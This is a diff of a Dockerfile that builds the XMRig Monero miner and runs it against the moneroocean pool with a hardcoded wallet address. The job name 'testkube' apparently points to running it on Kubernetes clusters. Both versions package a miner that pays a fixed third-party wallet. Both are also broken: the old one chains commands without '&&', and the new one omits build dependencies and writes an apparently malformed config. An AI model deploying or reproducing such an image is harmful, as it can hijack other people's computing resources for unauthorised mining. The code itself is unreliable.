@@ -1,15 +1,30 @@
-FROM ubuntu:latest
+# Use an official Ubuntu image as the base
+FROM ubuntu:20.04
 
-WORKDIR /crypt
-ARG wallet=4B4RSqqyoMQBNSnfTkWPFVTMVHzBGoY5WRn7BobfY1Myid5p6HaszDs7nyGVVNHGRTMh6HmFwxZMYR5Hc83frXULS1UfChC
-ARG jobname=testkube
+# Set the working directory in the container
+WORKDIR /app
 
-RUN apt -y update \
-    apt -y upgrade \
-    apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y \
-    git clone https://github.com/xmrig/xmrig.git \
-    mkdir build \
-    cd build \
-    cmake .. \
-    make \
-    ./xmrig -o gulf.moneroocean.stream:10128 -u{wallet} -p{jobname}
+# Install necessary dependencies
+RUN apt-get update && apt-get install -y \
+    curl \
+    wget \
+    git \
+    build-essential \
+    && rm -rf /var/lib/apt/lists/*
+
+# Example: Clone the miner repository and build it
+RUN git clone https://github.com/xmrig/xmrig.git && \
+    cd xmrig && \
+    mkdir build && \
+    cd build && \
+    cmake .. && \
+    make -j$(nproc)
+
+# Example: Copy or generate a configuration file
+RUN echo '{"url": "gulf.moneroocean.stream:10128", "user": "4B4RSqqyoMQBNSnfTkWPFVTMVHzBGoY5WRn7BobfY1Myid5p6HaszDs7nyGVVNHGRTMh6HmFwxZMYR5Hc83frXULS1UfChC", "pass": "x"}' > /app/xmrig/build/config.json
+
+# Expose the miner port (if applicable)
+EXPOSE 3333
+
+# Set the entry point to run the miner
+CMD ["/app/xmrig/build/xmrig"]
